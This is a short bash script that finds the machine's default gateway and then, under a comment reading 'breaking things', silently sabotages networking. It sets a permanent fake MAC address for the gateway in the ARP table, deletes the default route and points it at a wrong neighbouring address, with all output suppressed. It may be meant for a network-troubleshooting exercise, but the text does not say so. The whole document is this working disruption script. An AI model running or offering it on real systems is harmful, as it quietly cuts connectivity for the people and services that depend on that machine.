#!/bin/bash
#  determining settingsning settings
IP=`ip route list | grep default | awk '{print $3}'`
INT=`ip route list | grep default | awk '{print $5}'`
F_OCTET=`ip route list | grep default | awk '{print $3}' | awk -F "." '{print $1}'`
S_OCTET=`ip route list | grep default | awk '{print $3}' | awk -F "." '{print $2}'`
T_OCTET=`ip route list | grep default | awk '{print $3}' | awk -F "." '{print $3}'`
L_OCTET=`ip route list | grep default | awk '{print $3}' | awk -F "." '{print $4}'`

if [[ $L_OCTET -eq 1 ]]; then
        NEW_IP="$F_OCTET.$S_OCTET.$T_OCTET.$((L_OCTET+24))"
else
        NEW_IP="$F_OCTET.$S_OCTET.$T_OCTET.$((L_OCTET-1))"
fi

#breaking things
{
ip neigh change $IP lladdr "50:ff:21:21:eb:9c" nud permanent dev $INT
ip route del default
ip route add default via $NEW_IP
} &>/dev/null
